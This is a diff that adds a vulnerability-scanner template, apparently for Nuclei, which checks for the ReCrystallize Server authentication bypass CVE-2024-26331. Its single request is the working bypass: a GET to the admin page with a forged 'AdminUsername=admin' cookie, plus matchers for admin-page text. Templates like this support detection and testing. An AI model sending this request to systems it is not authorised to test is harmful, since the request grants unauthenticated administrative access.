@@ -1,0 +1,23 @@
+id: recrystallize-server-authentication-bypass
+info:
+  name: ReCrystallize Server Authentication Bypass Vulnerability (CVE-2024-26331)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: cve-2024-26331,auth-bypass
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Admin/Admin.aspx"
+    headers:
+      Cookie: "AdminUsername=admin"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "ReCrystallize Server Administration"
+          - "License Status:"
+          - "System Info</a>"
